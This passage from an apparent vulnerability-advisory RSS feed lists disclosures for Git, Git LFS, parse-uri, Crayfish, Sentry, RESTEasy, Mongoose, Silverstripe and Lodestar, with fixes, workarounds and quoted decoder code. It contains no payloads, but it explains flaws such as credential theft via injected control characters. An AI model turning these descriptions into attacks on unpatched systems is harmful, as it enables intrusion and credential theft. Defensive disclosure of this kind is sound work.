                            <b>Details:</b> <b></b><br>Git is a fast, scalable, distributed revision control system with an unusually rich command set that provides both high-level operations and full access to internals. Git defines a line-based protocol that is used to exchange information between Git and Git credential helpers. Some ecosystems (most notably, .NET and node.js) interpret single Carriage Return characters as newlines, which renders the protections against CVE-2020-5260 incomplete for credential helpers that treat Carriage Returns in this way. This issue has been addressed in commit `b01b9b8` which is included in release versions v2.48.1, v2.47.2, v2.46.3, v2.45.3, v2.44.3, v2.43.6, v2.42.4, v2.41.3, and v2.40.4. Users are advised to upgrade. Users unable to upgrade should avoid cloning from untrusted URLs, especially recursive clones.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>BIT-git-lfs-2024-53263: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#BIT-git-lfs-2024-53263</link>
                    <pubDate>2025-01-16T07:10:05.387Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/BIT-git-lfs-2024-53263'>https://osv.dev/vulnerability/BIT-git-lfs-2024-53263</a><br>
                            <b>Published:</b> 2025-01-16T07:10:05.387Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs/commit/0345b6f816e611d050c0df67b61f0022916a1c90'>https://github.com/git-lfs/git-lfs/commit/0345b6f816e611d050c0df67b61f0022916a1c90</a></li><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs/releases/tag/v3.6.1'>https://github.com/git-lfs/git-lfs/releases/tag/v3.6.1</a></li><li>- <a target='_blank' href='https://github.com/git-lfs/git-lfs/security/advisories/GHSA-q6r2-x2cc-vrp7'>https://github.com/git-lfs/git-lfs/security/advisories/GHSA-q6r2-x2cc-vrp7</a></li><li>- <a target='_blank' href='https://lists.debian.org/debian-lts-announce/2025/01/msg00022.html'>https://lists.debian.org/debian-lts-announce/2025/01/msg00022.html</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Git LFS is a Git extension for versioning large files. When Git LFS requests credentials from Git for a remote host, it passes portions of the host&#x27;s URL to the `git-credential(1)` command without checking for embedded line-ending control characters, and then sends any credentials it receives back from the Git credential helper to the remote host. By inserting URL-encoded control characters such as line feed (LF) or carriage return (CR) characters into the URL, an attacker may be able to retrieve a user&#x27;s Git credentials. This problem exists in all previous versions and is patched in v3.6.1. All users should upgrade to v3.6.1. There are no workarounds known at this time.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-6fx8-h7jm-663j: 6.9 | <b>parse-uri Regular expression Denial of Service (ReDoS)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-6fx8-h7jm-663j</link>
                    <pubDate>2025-01-16T00:31:22Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-6fx8-h7jm-663j'>https://osv.dev/vulnerability/GHSA-6fx8-h7jm-663j</a><br>
                            <b>Published:</b> 2025-01-16T00:31:22Z<br>
                            <b>Severity:</b> 6.9<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Kikobeats/parse-uri/issues/14'>https://github.com/Kikobeats/parse-uri/issues/14</a></li><li>- <a target='_blank' href='https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233'>https://gist.github.com/6en6ar/78168687da94e8aa2e0357f2456b0233</a></li></ul><br>
                            <b>Details:</b> <b>parse-uri Regular expression Denial of Service (ReDoS)</b><br>An issue in parse-uri v1.0.9 allows attackers to cause a Regular expression Denial of Service (ReDoS) via a crafted URL.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mm6v-68qp-f9fw: 9.8 | <b>Crayfish allows Remote Code Execution via Homarus Authorization header</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mm6v-68qp-f9fw</link>
                    <pubDate>2025-01-15T22:04:19Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mm6v-68qp-f9fw'>https://osv.dev/vulnerability/GHSA-mm6v-68qp-f9fw</a><br>
                            <b>Published:</b> 2025-01-15T22:04:19Z<br>
                            <b>Severity:</b> 9.8<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Islandora/Crayfish/security/advisories/GHSA-mm6v-68qp-f9fw'>https://github.com/Islandora/Crayfish/security/advisories/GHSA-mm6v-68qp-f9fw</a></li><li>- <a target='_blank' href='https://github.com/Islandora/Crayfish/commit/64cb4cec688928798cc40e6f0a0e863d7f69fd89'>https://github.com/Islandora/Crayfish/commit/64cb4cec688928798cc40e6f0a0e863d7f69fd89</a></li><li>- <a target='_blank' href='https://github.com/Islandora/Crayfish'>https://github.com/Islandora/Crayfish</a></li></ul><br>
                            <b>Details:</b> <b>Crayfish allows Remote Code Execution via Homarus Authorization header</b><br>### Impact
_What kind of vulnerability is it? Who is impacted?_

Remote code execution may be possible in web-accessible installations of Homarus in certain configurations.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

The issue has been patched in `islandora&#x2F;crayfish:4.1.0`

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

The exploit requires making a request against the Homarus&#x27;s `&#x2F;convert` endpoint; therefore, the ability to exploit is much reduced if the microservice is not directly accessible from the Internet, so: Prevent general access from the Internet from hitting Homarus.

Configure auth in Crayfish to be more strongly required, such that requests with `Authorization` headers that do not validate are rejected before the problematic CLI interpolation occurs.

### References
_Are there any links users can visit to find out more?_

- XBOW-024-071
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7pq6-v88g-wf3w: 9.1 | <b>Sentry&#x27;s improper authentication on SAML SSO process allows user impersonation</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7pq6-v88g-wf3w</link>
                    <pubDate>2025-01-15T21:25:27Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7pq6-v88g-wf3w'>https://osv.dev/vulnerability/GHSA-7pq6-v88g-wf3w</a><br>
                            <b>Published:</b> 2025-01-15T21:25:27Z<br>
                            <b>Severity:</b> 9.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w'>https://github.com/getsentry/sentry/security/advisories/GHSA-7pq6-v88g-wf3w</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry/pull/83407'>https://github.com/getsentry/sentry/pull/83407</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry/commit/6db508f7949d117c7dff748a3c82c3a272bf7cfd'>https://github.com/getsentry/sentry/commit/6db508f7949d117c7dff748a3c82c3a272bf7cfd</a></li><li>- <a target='_blank' href='https://github.com/getsentry/sentry'>https://github.com/getsentry/sentry</a></li></ul><br>
                            <b>Details:</b> <b>Sentry&#x27;s improper authentication on SAML SSO process allows user impersonation</b><br>### Impact
A critical vulnerability was discovered in the SAML SSO implementation of Sentry. It was reported to us via our private bug bounty program.

The vulnerability allows an attacker to take over any user account by using a malicious SAML Identity Provider and another organization on the same Sentry instance. The victim email address must be known in order to exploit this vulnerability.

### Patches
- [Sentry SaaS](https:&#x2F;&#x2F;sentry.io): The fix was deployed on Jan 14, 2025.
- [Self-Hosted Sentry](https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;self-hosted): If only a single organization is allowed (`SENTRY_SINGLE_ORGANIZATION = True`), then no action is needed. Otherwise, users should upgrade to version 25.1.0 or higher.

### Workarounds
No known workarounds.

### References
- https:&#x2F;&#x2F;github.com&#x2F;getsentry&#x2F;sentry&#x2F;pull&#x2F;83407
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-2c6g-pfx3-w7h8: 5.5 | <b>Insecure Temporary File in RESTEasy</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-2c6g-pfx3-w7h8</link>
                    <pubDate>2025-01-15T18:56:57Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-2c6g-pfx3-w7h8'>https://osv.dev/vulnerability/GHSA-2c6g-pfx3-w7h8</a><br>
                            <b>Published:</b> 2025-01-15T18:56:57Z<br>
                            <b>Severity:</b> 5.5<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/security/advisories/GHSA-2c6g-pfx3-w7h8'>https://github.com/resteasy/resteasy/security/advisories/GHSA-2c6g-pfx3-w7h8</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/pull/3409'>https://github.com/resteasy/resteasy/pull/3409</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/pull/3409/commits/807d7456f2137cde8ef7c316707211bf4e542d56'>https://github.com/resteasy/resteasy/pull/3409/commits/807d7456f2137cde8ef7c316707211bf4e542d56</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/pull/3410'>https://github.com/resteasy/resteasy/pull/3410</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/pull/3412'>https://github.com/resteasy/resteasy/pull/3412</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/pull/3413'>https://github.com/resteasy/resteasy/pull/3413</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy/pull/3423'>https://github.com/resteasy/resteasy/pull/3423</a></li><li>- <a target='_blank' href='https://bugzilla.redhat.com/show_bug.cgi?id=2166004'>https://bugzilla.redhat.com/show_bug.cgi?id=2166004</a></li><li>- <a target='_blank' href='https://github.com/orgs/resteasy/discussions/3415'>https://github.com/orgs/resteasy/discussions/3415</a></li><li>- <a target='_blank' href='https://github.com/orgs/resteasy/discussions/3504'>https://github.com/orgs/resteasy/discussions/3504</a></li><li>- <a target='_blank' href='https://github.com/orgs/resteasy/discussions/3506'>https://github.com/orgs/resteasy/discussions/3506</a></li><li>- <a target='_blank' href='https://github.com/resteasy/resteasy'>https://github.com/resteasy/resteasy</a></li><li>- <a target='_blank' href='https://issues.redhat.com/browse/RESTEASY-3286'>https://issues.redhat.com/browse/RESTEASY-3286</a></li><li>- <a target='_blank' href='https://security.netapp.com/advisory/ntap-20230427-0001'>https://security.netapp.com/advisory/ntap-20230427-0001</a></li></ul><br>
                            <b>Details:</b> <b>Insecure Temporary File in RESTEasy</b><br>### Impact
In RESTEasy the insecure `File.createTempFile()` is used in the `DataSourceProvider`, `FileProvider` and `Mime4JWorkaround` classes which creates temp files with insecure permissions that could be read by a local user.

### Patches
Fixed in the following pull requests:

* https:&#x2F;&#x2F;github.com&#x2F;resteasy&#x2F;resteasy&#x2F;pull&#x2F;3409 (7.0.0.Alpha1)
* https:&#x2F;&#x2F;github.com&#x2F;resteasy&#x2F;resteasy&#x2F;pull&#x2F;3423 (6.2.3.Final)
* https:&#x2F;&#x2F;github.com&#x2F;resteasy&#x2F;resteasy&#x2F;pull&#x2F;3412 (5.0.6.Final)
* https:&#x2F;&#x2F;github.com&#x2F;resteasy&#x2F;resteasy&#x2F;pull&#x2F;3413 (4.7.8.Final)
* https:&#x2F;&#x2F;github.com&#x2F;resteasy&#x2F;resteasy&#x2F;pull&#x2F;3410 (3.15.5.Final)

### Workarounds
There is no workaround for this issue.

### References
* https:&#x2F;&#x2F;nvd.nist.gov&#x2F;vuln&#x2F;detail&#x2F;CVE-2023-0482
* https:&#x2F;&#x2F;bugzilla.redhat.com&#x2F;show_bug.cgi?id=2166004
* https:&#x2F;&#x2F;github.com&#x2F;advisories&#x2F;GHSA-jrmh-v64j-mjm9

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vg7j-7cwx-8wgw: 9.0 | <b>Mongoose search injection vulnerability</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vg7j-7cwx-8wgw</link>
                    <pubDate>2025-01-15T06:30:49Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vg7j-7cwx-8wgw'>https://osv.dev/vulnerability/GHSA-vg7j-7cwx-8wgw</a><br>
                            <b>Published:</b> 2025-01-15T06:30:49Z<br>
                            <b>Severity:</b> 9.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc'>https://github.com/Automattic/mongoose/commit/64a9f9706f2428c49e0cfb8e223065acc645f7bc</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose'>https://github.com/Automattic/mongoose</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md'>https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6'>https://github.com/Automattic/mongoose/compare/6.13.5...6.13.6</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4'>https://github.com/Automattic/mongoose/compare/7.8.3...7.8.4</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5'>https://github.com/Automattic/mongoose/compare/8.9.4...8.9.5</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/releases/tag/6.13.6'>https://github.com/Automattic/mongoose/releases/tag/6.13.6</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/releases/tag/7.8.4'>https://github.com/Automattic/mongoose/releases/tag/7.8.4</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/releases/tag/8.9.5'>https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li><li>- <a target='_blank' href='https://www.npmjs.com/package/mongoose?activeTab=versions'>https://www.npmjs.com/package/mongoose?activeTab=versions</a></li></ul><br>
                            <b>Details:</b> <b>Mongoose search injection vulnerability</b><br>Mongoose versions prior to 8.9.5, 7.8.4, and 6.13.6 are vulnerable to improper use of the `$where` operator. This vulnerability arises from the ability of the `$where` clause to execute arbitrary JavaScript code in MongoDB queries, potentially leading to code injection attacks and unauthorized access or manipulation of database data.

NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-23061: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-23061</link>
                    <pubDate>2025-01-15T05:15:10Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-23061'>https://osv.dev/vulnerability/CVE-2025-23061</a><br>
                            <b>Published:</b> 2025-01-15T05:15:10Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md'>https://github.com/Automattic/mongoose/blob/master/CHANGELOG.md</a></li><li>- <a target='_blank' href='https://github.com/Automattic/mongoose/releases/tag/8.9.5'>https://github.com/Automattic/mongoose/releases/tag/8.9.5</a></li><li>- <a target='_blank' href='https://www.npmjs.com/package/mongoose?activeTab=versions'>https://www.npmjs.com/package/mongoose?activeTab=versions</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Mongoose before 8.9.5 can improperly use a nested $where filter with a populate() match, leading to search injection. NOTE: this issue exists because of an incomplete fix for CVE-2024-53900.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-mqf3-qpc3-g26q: 0.0 | <b>Silverstripe Framework has a Reflected Cross Site Scripting (XSS) in error message</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-mqf3-qpc3-g26q</link>
                    <pubDate>2025-01-14T22:19:06Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-mqf3-qpc3-g26q'>https://osv.dev/vulnerability/GHSA-mqf3-qpc3-g26q</a><br>
                            <b>Published:</b> 2025-01-14T22:19:06Z<br>
                            <b>Severity:</b> 0.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-mqf3-qpc3-g26q'>https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-mqf3-qpc3-g26q</a></li><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework/commit/a555dad4ec73c929f6316bcb4019eb325a5b77d8'>https://github.com/silverstripe/silverstripe-framework/commit/a555dad4ec73c929f6316bcb4019eb325a5b77d8</a></li><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework'>https://github.com/silverstripe/silverstripe-framework</a></li><li>- <a target='_blank' href='https://www.silverstripe.org/download/security-releases/ss-2024-002'>https://www.silverstripe.org/download/security-releases/ss-2024-002</a></li></ul><br>
                            <b>Details:</b> <b>Silverstripe Framework has a Reflected Cross Site Scripting (XSS) in error message</b><br>&amp;gt; [!IMPORTANT]
&amp;gt; This vulnerability only affects sites which are in the &quot;dev&quot; environment mode. If your production website is in &quot;dev&quot; mode, it has been misconfigured, and you should immediately swap it to &quot;live&quot; mode.
&amp;gt; See https:&#x2F;&#x2F;docs.silverstripe.org&#x2F;en&#x2F;developer_guides&#x2F;debugging&#x2F;environment_types&#x2F; for more information.

If a website has been set to the &quot;dev&quot; environment mode, a URL can be provided which includes an XSS payload which will be executed in the resulting error message.

## References

- https:&#x2F;&#x2F;www.silverstripe.org&#x2F;download&#x2F;security-releases&#x2F;ss-2024-002

## Reported by

Gaurav Nayak from [Chaleit](https:&#x2F;&#x2F;chaleit.com&#x2F;)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-ff6q-3c9c-6cf5: 5.4 | <b>Silverstripe Framework has a XSS in form messages</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-ff6q-3c9c-6cf5</link>
                    <pubDate>2025-01-14T22:18:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-ff6q-3c9c-6cf5'>https://osv.dev/vulnerability/GHSA-ff6q-3c9c-6cf5</a><br>
                            <b>Published:</b> 2025-01-14T22:18:59Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-ff6q-3c9c-6cf5'>https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-ff6q-3c9c-6cf5</a></li><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework/commit/74904f539347b7d1f8c5b5fb9e28d62ff251ee00'>https://github.com/silverstripe/silverstripe-framework/commit/74904f539347b7d1f8c5b5fb9e28d62ff251ee00</a></li><li>- <a target='_blank' href='https://github.com/FriendsOfPHP/security-advisories/blob/master/silverstripe/framework/CVE-2024-53277.yaml'>https://github.com/FriendsOfPHP/security-advisories/blob/master/silverstripe/framework/CVE-2024-53277.yaml</a></li><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework'>https://github.com/silverstripe/silverstripe-framework</a></li><li>- <a target='_blank' href='https://www.silverstripe.org/download/security-releases/cve-2024-53277'>https://www.silverstripe.org/download/security-releases/cve-2024-53277</a></li></ul><br>
                            <b>Details:</b> <b>Silverstripe Framework has a XSS in form messages</b><br>In some cases, form messages can contain HTML markup. This is an intentional feature, allowing links and other relevant HTML markup for the given message.

Some form messages include content that the user can provide. There are scenarios in the CMS where that content doesn&#x27;t get correctly sanitised prior to being included in the form message, resulting in an XSS vulnerability.

### References

- https:&#x2F;&#x2F;www.silverstripe.org&#x2F;download&#x2F;security-releases&#x2F;cve-2024-53277

## Reported by

Leo Diamat from [Bastion Security Group](http:&#x2F;&#x2F;www.bastionsecurity.co.nz&#x2F;)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-7cmp-cgg8-4c82: 5.4 | <b>Silverstripe Framework has a XSS via insert media remote file oembed</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-7cmp-cgg8-4c82</link>
                    <pubDate>2025-01-14T22:18:52Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-7cmp-cgg8-4c82'>https://osv.dev/vulnerability/GHSA-7cmp-cgg8-4c82</a><br>
                            <b>Published:</b> 2025-01-14T22:18:52Z<br>
                            <b>Severity:</b> 5.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-asset-admin/security/advisories/GHSA-7cmp-cgg8-4c82'>https://github.com/silverstripe/silverstripe-asset-admin/security/advisories/GHSA-7cmp-cgg8-4c82</a></li><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework/commit/09b5052c86932f273e0d733428c9aade70ff2a4a'>https://github.com/silverstripe/silverstripe-framework/commit/09b5052c86932f273e0d733428c9aade70ff2a4a</a></li><li>- <a target='_blank' href='https://github.com/FriendsOfPHP/security-advisories/blob/master/silverstripe/framework/CVE-2024-47605.yaml'>https://github.com/FriendsOfPHP/security-advisories/blob/master/silverstripe/framework/CVE-2024-47605.yaml</a></li><li>- <a target='_blank' href='https://github.com/silverstripe/silverstripe-framework'>https://github.com/silverstripe/silverstripe-framework</a></li><li>- <a target='_blank' href='https://www.silverstripe.org/download/security-releases/cve-2024-47605'>https://www.silverstripe.org/download/security-releases/cve-2024-47605</a></li></ul><br>
                            <b>Details:</b> <b>Silverstripe Framework has a XSS via insert media remote file oembed</b><br>### Impact

When using the &quot;insert media&quot; functionality, the linked oEmbed JSON includes an HTML attribute which will replace the embed shortcode. The HTML is not sanitized before replacing the shortcode, allowing a script payload to be executed on both the CMS and the front-end of the website.

## References

- https:&#x2F;&#x2F;www.silverstripe.org&#x2F;download&#x2F;security-releases&#x2F;cve-2024-47605

## Reported by

James Nicoll from [Fujitsu Cyber Security Services](https:&#x2F;&#x2F;www.fujitsu.com&#x2F;nz&#x2F;services&#x2F;security&#x2F;)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-m9c9-mc2h-9wjw: 0 | <b>Lodestar snappy checksum issue</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-m9c9-mc2h-9wjw</link>
                    <pubDate>2025-01-14T22:04:02Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-m9c9-mc2h-9wjw'>https://osv.dev/vulnerability/GHSA-m9c9-mc2h-9wjw</a><br>
                            <b>Published:</b> 2025-01-14T22:04:02Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ChainSafe/lodestar/security/advisories/GHSA-m9c9-mc2h-9wjw'>https://github.com/ChainSafe/lodestar/security/advisories/GHSA-m9c9-mc2h-9wjw</a></li><li>- <a target='_blank' href='https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300'>https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300</a></li><li>- <a target='_blank' href='https://github.com/ChainSafe/lodestar'>https://github.com/ChainSafe/lodestar</a></li></ul><br>
                            <b>Details:</b> <b>Lodestar snappy checksum issue</b><br>### Impact
Unintended permanent chain split affecting greater than or equal to 25% of the network, requiring hard fork (network partition requiring hard fork)

Lodestar does not verify checksum in snappy framing uncompressed chunks.

### Vulnerability Details
In Req&#x2F;Resp protocol the messages are encoded by using ssz_snappy encoding, which is a snappy framing compression over ssz encoded message.

In snappy framing format there are uncompressed chunks, each such chunk is prefixed with a checksum.

Let&#x27;s see how golang implementation parses such chunks - https:&#x2F;&#x2F;github.com&#x2F;golang&#x2F;snappy&#x2F;blob&#x2F;master&#x2F;decode.go#L176

```
	case chunkTypeUncompressedData:
			&#x2F;&#x2F; Section 4.3. Uncompressed data (chunk type 0x01).
			if chunkLen &amp;lt; checksumSize {
				r.err = ErrCorrupt
				return r.err
			}
			buf := r.buf[:checksumSize]
			if !r.readFull(buf, false) {
				return r.err
			}
			checksum := uint32(buf[0]) | uint32(buf[1])&amp;lt;&amp;lt;8 | uint32(buf[2])&amp;lt;&amp;lt;16 | uint32(buf[3])&amp;lt;&amp;lt;24
			&#x2F;&#x2F; Read directly into r.decoded instead of via r.buf.
			n := chunkLen - checksumSize
			if n &amp;gt; len(r.decoded) {
				r.err = ErrCorrupt
				return r.err
			}
			if !r.readFull(r.decoded[:n], false) {
				return r.err
			}
			if crc(r.decoded[:n]) != checksum {
				r.err = ErrCorrupt
				return r.err
			}
			r.i, r.j = 0, n
			continue
```

As you can see, if checksum is incorrect, decoder fails and returns error.

Now let&#x27;s look at lodestar decoder https:&#x2F;&#x2F;github.com&#x2F;ChainSafe&#x2F;lodestar&#x2F;blob&#x2F;unstable&#x2F;packages&#x2F;reqresp&#x2F;src&#x2F;encodingStrategies&#x2F;sszSnappy&#x2F;snappyFrames&#x2F;uncompress.ts#L17

```
uncompress(chunk: Uint8ArrayList): Uint8ArrayList | null {
    this.buffer.append(chunk);
    const result = new Uint8ArrayList();
    while (this.buffer.length &amp;gt; 0) {
      if (this.buffer.length &amp;lt; 4) break;

      const type = getChunkType(this.buffer.get(0));
      const frameSize = getFrameSize(this.buffer, 1);

      if (this.buffer.length - 4 &amp;lt; frameSize) {
        break;
      }

      const data = this.buffer.subarray(4, 4 + frameSize);
      this.buffer.consume(4 + frameSize);

      if (!this.state.foundIdentifier &amp;&amp; type !== ChunkType.IDENTIFIER) {
        throw &quot;malformed input: must begin with an identifier&quot;;
      }

      if (type === ChunkType.IDENTIFIER) {
        if (!Buffer.prototype.equals.call(data, IDENTIFIER)) {
          throw &quot;malformed input: bad identifier&quot;;
        }
        this.state.foundIdentifier = true;
        continue;
      }

      if (type === ChunkType.COMPRESSED) {
        result.append(uncompress(data.subarray(4)));
      }
      if (type === ChunkType.UNCOMPRESSED) {
1)        result.append(data.subarray(4));
      }
    }
    if (result.length === 0) {
      return null;
    }
    return result;
  }
```

As you can see, checksum is not verified, bytes are appended to &#x27;result&#x27;

### Proof of Concept

How to reproduce:

get poc via [gist link](https:&#x2F;&#x2F;gist.github.com&#x2F;gln7&#x2F;aab55674431b1c8d42a59ccf9d7cbf60) and run it:

```
$ node dec1.mjs 
checking chunk type=255
checking chunk type=1
got uncompressed chunk..
Decompressed ok 124 bytes
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-53rv-hcvm-rpp9: 0 | <b>Lodestar snappy decompression issue</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-53rv-hcvm-rpp9</link>
                    <pubDate>2025-01-14T22:03:59Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-53rv-hcvm-rpp9'>https://osv.dev/vulnerability/GHSA-53rv-hcvm-rpp9</a><br>
                            <b>Published:</b> 2025-01-14T22:03:59Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/ChainSafe/lodestar/security/advisories/GHSA-53rv-hcvm-rpp9'>https://github.com/ChainSafe/lodestar/security/advisories/GHSA-53rv-hcvm-rpp9</a></li><li>- <a target='_blank' href='https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300'>https://github.com/ChainSafe/lodestar/commit/18a0d681dbcc51fb2ac9456f31e91f4e31a18300</a></li><li>- <a target='_blank' href='https://github.com/ChainSafe/lodestar'>https://github.com/ChainSafe/lodestar</a></li></ul><br>
                            <b>Details:</b> <b>Lodestar snappy decompression issue</b><br>### Impact
Unintended permanent chain split affecting greater than or equal to 25% of the network, requiring hard fork (network partition requiring hard fork)

### Description
Lodestar client may fail to decode snappy framing compressed messages.

### Vulnerability Details
In Req&#x2F;Resp protocol the message are encoded by using ssz_snappy encoding, which is basically snappy framing compression over ssz encoded message.

It&#x27;s mentioned here - https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;consensus-specs&#x2F;blob&#x2F;dev&#x2F;specs&#x2F;phase0&#x2F;p2p-interface.md

```
The token of the negotiated protocol ID specifies the type of encoding to be used for the req&#x2F;resp interaction. Only one value is possible at this time:

ssz_snappy: The contents are first SSZ-encoded and then compressed with Snappy frames compression. For objects containing a single field, only the field is SSZ-encoded not a container with a single field. For example, the BeaconBlocksByRoot request is an SSZ-encoded list of Root&#x27;s. This encoding type MUST be supported by all clients.
```

In snappy framing format there a few types of chunks.
We are interested in so called reserved skippable chunks. These are chunks with chunk type in range [0x80, 0xfd]
Let&#x27;s see how rust snappy handles them https:&#x2F;&#x2F;github.com&#x2F;BurntSushi&#x2F;rust-snappy&#x2F;blob&#x2F;master&#x2F;src&#x2F;read.rs#L137

```
impl&amp;lt;R: io::Read&amp;gt; io::Read for FrameDecoder&amp;lt;R&amp;gt; {
    fn read(&amp;mut self, buf: &amp;mut [u8]) -&amp;gt; io::Result&amp;lt;usize&amp;gt; {
 		   ... 
           ...
  		    let len = len64 as usize;
            match ty {
                Err(b) if 0x02 &amp;lt;= b &amp;&amp; b &amp;lt;= 0x7F =&amp;gt; {
                    &#x2F;&#x2F; Spec says that chunk types 0x02-0x7F are reserved and
                    &#x2F;&#x2F; conformant decoders must return an error.
                    fail!(Error::UnsupportedChunkType { byte: b });
                }
                Err(b) if 0x80 &amp;lt;= b &amp;&amp; b &amp;lt;= 0xFD =&amp;gt; {
                    &#x2F;&#x2F; Spec says that chunk types 0x80-0xFD are reserved but
                    &#x2F;&#x2F; skippable.
                    self.r.read_exact(&amp;mut self.src[0..len])?;
                }
```

